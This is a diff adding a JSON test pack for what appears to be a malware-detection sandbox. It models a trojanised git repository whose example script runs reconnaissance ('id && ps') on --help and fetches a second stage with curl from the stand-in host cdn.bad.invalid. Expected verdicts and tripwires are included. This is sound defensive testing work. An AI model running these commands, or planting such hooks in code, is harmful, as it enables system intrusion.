@@ -1,0 +1,39 @@
+{
+  "pack_id": "git-hidden-example-payload",
+  "title": "Hidden payload in examples path",
+  "attack_family": "runtime_trojan",
+  "public_tier": "public_core",
+  "runtime_family": "java_script",
+  "artifact_type": "git_repo",
+  "artifact": {
+    "ecosystem": "git",
+    "source": "https://github.com/jeppsontaylor/hidden-example-payload.git",
+    "requested_selector": "refs/heads/main",
+    "selector_kind": "branch"
+  },
+  "incident_refs": ["public/hidden-payload-in-examples"],
+  "technique_refs": ["payload-on-help", "docs-example-trojan"],
+  "control_pair_id": "control-benign-git-release",
+  "confidence_policy": "control_diff_required",
+  "allowed_baseline_signals": ["system_recon_burst"],
+  "persona_overrides": [],
+  "required_personas": ["developer_workstation"],
+  "required_scenarios": [
+    { "name": "help_trigger", "detonation": "cli_smoke", "phase": "cli" }
+  ],
+  "suite_tags": ["fast", "artifact", "queue", "public_core"],
+  "execution": { "browser_required": false, "vm_required": false, "queue_required": true, "runner_mode": "queue_full" },
+  "expected_verdict": { "verdict": "malicious" },
+  "expected_tripwires": { "required": ["system_recon_burst", "downloader"], "allowed_false_positives": [] },
+  "control_expectations": { "require_clean_verdict": true, "max_shared_tripwires": 0, "notes": ["help path must not trigger hidden payload"] },
+  "evidence_minimums": {
+    "require_captured_request": true, "require_quarantine_job": true, "require_lab_run": true,
+    "require_evidence_bundle": true, "require_feed_visibility": true, "require_browser_trace": false
+  },
+  "timing": { "max_queue_latency_ms": 2000, "max_detonation_startup_ms": 2000, "max_verdict_completion_ms": 2000 },
+  "files": ["README.md"],
+  "steps": [
+    { "step_id": "help_recon", "detail": "example helper enumerates the system when invoked with --help", "phase": "cli", "process_lineage": ["node examples/tool.js --help"], "command": "id && ps", "tripwire": "system_recon_burst", "severity": "medium" },
+    { "step_id": "help_download", "detail": "helper fetches a second-stage payload after recon", "phase": "cli", "process_lineage": ["node examples/tool.js --help"], "command": "curl https://cdn.bad.invalid/example", "network_target": "cdn.bad.invalid", "network_protocol": "https", "tripwire": "downloader", "severity": "high" }
+  ]
+}
